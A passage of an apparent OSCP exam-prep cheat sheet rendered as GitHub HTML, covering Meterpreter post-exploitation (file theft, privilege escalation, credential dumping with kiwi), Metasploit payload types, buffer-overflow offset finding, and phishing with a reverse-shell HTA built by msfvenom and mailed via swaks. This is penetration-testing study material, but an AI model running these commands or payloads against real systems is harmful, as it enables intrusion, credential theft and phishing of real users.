class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e download file from victim\u003c/span\u003e\nmeterpreter\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e download /etc/passwd\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e upload file to victim\u003c/span\u003e\nmeterpreter\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e upload /usr/bin/unix-privesc-check /tmp/\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e attempt to auto-privesc to SYSTEM (on Windows host)\u003c/span\u003e\nmeterpreter\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e getsystem\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e migrate your process to the memory of another process\u003c/span\u003e\nmeterpreter\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e ps \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e find another process running with same user as you\u003c/span\u003e\nmeterpreter\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e migrate PID \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e move your process to the memory of another process\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e spawn a process hidden ('-H') from user (no window)\u003c/span\u003e\nmeterpreter\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e execute -H -f iexplore.exe\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e use mimikatz functionality to grab credentials\u003c/span\u003e\nmeterpreter\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e load kiwi\nmeterpreter\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e creds_all\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e add local port forward rule via meterpreter\u003c/span\u003e\nmeterpreter\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e portfwd add -l LPORT -p RPORT -r RHOST\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e send this meterpreter session to background (return to msf console)\u003c/span\u003e\nmeterpreter\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ebg\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e shut down meterpreter agent\u003c/span\u003e\nmeterpreter\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eexit\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.4.4 Metasploit Modules and Payloads\u003c/h3\u003e\u003ca id=\"user-content-344-metasploit-modules-and-payloads\" class=\"anchor\" aria-label=\"Permalink: 3.4.4 Metasploit Modules and Payloads\" href=\"#344-metasploit-modules-and-payloads\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eMetasploit modules are located in:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"/usr/share/metasploit-framework/modules/\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e/usr/share/metasploit-framework/modules/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThese are the types/categories of Metasploit modules:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003cstrong\u003eExploit\u003c/strong\u003e - Exploits a vulnerability in a system/service, injecting your shellcode/command payload.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAuxiliary\u003c/strong\u003e - Does not execute a payload, but can be used to perform arbitrary actions that may not be directly related to exploitation. Examples of auxiliary modules include scanners, fuzzers, and denial of service attacks.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePost-Exploitation\u003c/strong\u003e - Enables you to gather more information or to gain further access to an exploited target system. E.g. hash dumps and service enumerators.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePayload\u003c/strong\u003e - A payload is the shell code that runs after an exploit successfully compromises a system. Defines what you want to do to the target system after you take control of it (e.g. Meterpreter, TCP reverse shell, run shell command).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eNOP generator\u003c/strong\u003e - A NOP generator produces a series of random bytes that you can use to bypass standard IDS and IPS NOP sled signatures. Use NOP generators to pad buffers.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eMetasploit \u003cstrong\u003epayloads\u003c/strong\u003e are either \u003cem\u003esingle\u003c/em\u003e (non-staged) or \u003cem\u003estaged\u003c/em\u003e:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003cem\u003eSingle\u003c/em\u003e payloads are entirely self-contained, fire-and-forget, and typically have a larger size, but they are more stable. They have extra \u003cstrong\u003eunderscores\u003c/strong\u003e in their name (\u003ccode\u003elinux/shell_reverse_tcp\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cem\u003eStaged\u003c/em\u003e payloads are basically a dropper that fetches and executes the rest after a callback. They are smaller in size, but can be less stable, and they require a metasploit handler to be listening to serve up the rest of the payload. They use extra \u003cstrong\u003eslashes\u003c/strong\u003e in their name (\u003ccode\u003elinux/shell/reverse_tcp\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.5 Buffer Overflows\u003c/h2\u003e\u003ca id=\"user-content-35-buffer-overflows\" class=\"anchor\" aria-label=\"Permalink: 3.5 Buffer Overflows\" href=\"#35-buffer-overflows\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eI wrote a great python script for tackling the old-school OSCP BOF boxes.\nCheck it out \u003ca href=\"/camercu/oscp-prep/blob/main/tools/pwn-bof-template.py\"\u003ehere\u003c/a\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eFor quick-and dirty offset finding, sometimes you can try something like:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# using radare2's ragg2 utility for pattern generation:\nragg2 -rP 4096 | nc -nv $VICTIM_IP $PORT\n# look up offset (note: must be hex value with '0x' at start!):\nragg2 -q 0x414a4141\n\n# using msf's pattern_create.rb:\nmsf-pattern_create -l 1024 | nc -nv $VICTIM_IP $PORT\n# look up offset (can be either hex value or string)\nmsf-pattern_offset -q 2Aa3\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using radare2's ragg2 utility for pattern generation:\u003c/span\u003e\nragg2 -rP 4096 \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e nc -nv \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$PORT\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look up offset (note: must be hex value with '0x' at start!):\u003c/span\u003e\nragg2 -q 0x414a4141\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using msf's pattern_create.rb:\u003c/span\u003e\nmsf-pattern_create -l 1024 \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e nc -nv \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$PORT\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look up offset (can be either hex value or string)\u003c/span\u003e\nmsf-pattern_offset -q 2Aa3\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIn Windows' Immunity Debugger, you can use \u003ca href=\"https://github.com/corelan/mona\"\u003emona.py\u003c/a\u003e for building exploits.\nHere are some useful commands:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# To make mona easier to work with, set a custom working folder:\n!mona config -set workingfolder c:\\mona\n\n# find the offset of EIP register in your buffer:\n!mona findmsp -distance \u0026lt;PATTERN_SIZE\u0026gt;\n# equivalent to:\nmsf-pattern_offset -q EIP_VAL\n\n# Check for bad bytes. First start with baseline pattern that uses all bytes\n# except null:\n!mona bytearray -b \u0026quot;\\x00\u0026quot;\n# Then compare your memory at ESP with the baseline:\n!mona compare -f C:\\mona\\bytearray.bin -a \u0026lt;ESP_ADDR\u0026gt;\n# Finally, add any found bad bytes to the list, repeating the exploit/check\n# until you get \u0026quot;Unmodified\u0026quot; status after running the compare command.\n\n# find 'jmp esp' gadget, excluding bad bytes in the pointer\n!mona jmp -r esp -cpb '\\x00\\x51'\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e To make mona easier to work with, set a custom working folder:\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e!\u003c/span\u003emona config -set workingfolder c:\u003cspan class=\"pl-cce\"\u003e\\m\u003c/span\u003eona\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e find the offset of EIP register in your buffer:\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e!\u003c/span\u003emona findmsp -distance \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003ePATTERN_SIZE\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e equivalent to:\u003c/span\u003e\nmsf-pattern_offset -q EIP_VAL\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Check for bad bytes. First start with baseline pattern that uses all bytes\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e except null:\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e!\u003c/span\u003emona bytearray -b \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\\x00\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Then compare your memory at ESP with the baseline:\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e!\u003c/span\u003emona compare -f C:\u003cspan class=\"pl-cce\"\u003e\\m\u003c/span\u003eona\u003cspan class=\"pl-cce\"\u003e\\b\u003c/span\u003eytearray.bin -a \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003eESP_ADDR\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Finally, add any found bad bytes to the list, repeating the exploit/check\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e until you get \"Unmodified\" status after running the compare command.\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e find 'jmp esp' gadget, excluding bad bytes in the pointer\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e!\u003c/span\u003emona jmp -r esp -cpb \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\\x00\\x51\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.6 Client-Side Attacks\u003c/h2\u003e\u003ca id=\"user-content-36-client-side-attacks\" class=\"anchor\" aria-label=\"Permalink: 3.6 Client-Side Attacks\" href=\"#36-client-side-attacks\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.6.1 Phishing Emails\u003c/h3\u003e\u003ca id=\"user-content-361-phishing-emails\" class=\"anchor\" aria-label=\"Permalink: 3.6.1 Phishing Emails\" href=\"#361-phishing-emails\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eTo send a phishing email with a malicious attachment, you can use the \u003ccode\u003eswaks\u003c/code\u003e tool:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# first, write a semi-convincing email body:\nvim body.txt\n\n# and create your malicious attachment\nmsfvenom -p windows/shell_reverse_tcp -f hta-psh -o derp.hta lport=443 lhost=tun0\n\n# then send the email\nswaks -t recipient1@example.com -t recipient2@example.com --from fakesender@example.com --attach @derp.hta --server SMTP_SERVER --body @body.txt --header \u0026quot;Subject: Clickbait\u0026quot; --suppress-data -ap\n# it will prompt to input username and password if it's not an open SMTP server\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e first, write a semi-convincing email body:\u003c/span\u003e\nvim body.txt\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e and create your malicious attachment\u003c/span\u003e\nmsfvenom -p windows/shell_reverse_tcp -f hta-psh -o derp.hta lport=443 lhost=tun0\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e then send the email\u003c/span\u003e\nswaks -t recipient1@example.com -t recipient2@example.com --from fakesender@example.com --attach @derp.hta --server SMTP_SERVER --body @body.txt --header \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eSubject: Clickbait\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e --suppress-data -ap\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e it will prompt to input username and password if it's not an open SMTP server\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAnother option is to use the \u003ccode\u003esendemail\u003c/code\u003e tool:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"sendemail -f sender@example.com -t receiver@example.com -u \u0026quot;Subject text\u0026quot; -m \u0026quot;Message body text.\u0026quot; -a FILE_ATTACHMENT -s SMTP_SERVER [-xu USERNAME -xp PASSWORD]\"\u003e\u003cpre\u003esendemail -f sender@example.com -t receiver@example.com -u \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eSubject text\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -m \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eMessage body text.\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -a FILE_ATTACHMENT -s SMTP_SERVER [-xu USERNAME \u003cspan class=\"pl-k\"\u003e-x\u003c/span\u003ep PASSWORD]\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eA third option is to configure the Thunderbird email application to use the SMTP credentials to send your email via a GUI. When you're done, delete the profile from Thunderbird by opening the profile manager:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# open profile manager to delete old profiles\nthunderbird -p\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e open profile manager to delete old profiles\u003c/span\u003e\nthunderbird -p\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.6.2 HTA Files\u003c/h3\u003e\u003ca id=\"user-content-362-hta-files\" class=\"anchor\" aria-label=\"Permalink: 3.6.2 HTA Files\" href=\"#362-hta-files\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWindows Internet Explorer and Edge browsers support \u003cem\u003eHTML Applications\u003c/em\u003e (\u003ccode\u003e.hta\u003c/code\u003e files) that can run arbitrary code using Windows scripting languages like VBScript encapsulated in HTML. Instead of being run in the security context of the browser (where access to system resources is limited), the browser automatically detects the \u003ccode\u003e.hta\u003c/code\u003e extension and executes it with the user's permissions via \u003ccode\u003emshta.exe\u003c/code\u003e (after prompting the user if they want to run it).\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eSend one of these files to a user (or a link to one), and if they execute it, you win.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eHere's the basic template (save as \u003ccode\u003ederp.hta\u003c/code\u003e):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;html\u0026gt;\n\u0026lt;head\u0026gt;\n\u0026lt;script language=\u0026quot;VBScript\u0026quot;\u0026gt;\n\n  \u0026lt;!-- just opens cmd terminal --\u0026gt;\n  var c= 'cmd.exe'\n  new ActiveXObject('WScript.Shell').Run(c);\n\n\u0026lt;/script\u0026gt;\n\u0026lt;/head\u0026gt;\n\u0026lt;body\u0026gt;\n\u0026lt;script language=\u0026quot;VBScript\u0026quot;\u0026gt;\n\u0026lt;!-- close this HTA window now that script running --\u0026gt;\nself.close();\n\u0026lt;/script\u0026gt;\n\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ehtml\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ehead\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003elanguage\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003eVBScript\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\n  \u0026lt;!-- just opens cmd terminal --\u0026gt;\n  \u003cspan class=\"pl-k\"\u003evar\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ec\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'cmd.exe'\u003c/span\u003e\n  \u003cspan class=\"pl-k\"\u003enew\u003c/span\u003e \u003cspan class=\"pl-v\"\u003eActiveXObject\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'WScript.Shell'\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003eRun\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003ec\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ehead\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ebody\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003elanguage\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003eVBScript\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u0026lt;!-- close this HTA window now that script running --\u0026gt;\n\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003eclose\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ebody\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ehtml\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eYou can use msfvenom to generate an HTA file that will give you a reverse shell. You can either use the generated file directly or replace the top script block with a msfvenom payload:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"msfvenom -p windows/shell_reverse_tcp -f hta-psh -o derp.hta lport=443 lhost=tun0\"\u003e\u003cpre\u003emsfvenom -p windows/shell_reverse_tcp -f hta-psh -o derp.hta lport=443 lhost=tun0\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.6.3 Malicious Office Macros\u003c/h3\u003e\u003ca id=\"user-content-363-malicious-office-macros\" class=\"anchor\" aria-label=\"Permalink: 3.6.3 Malicious Office Macros\" href=\"#363-malicious-office-macros\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 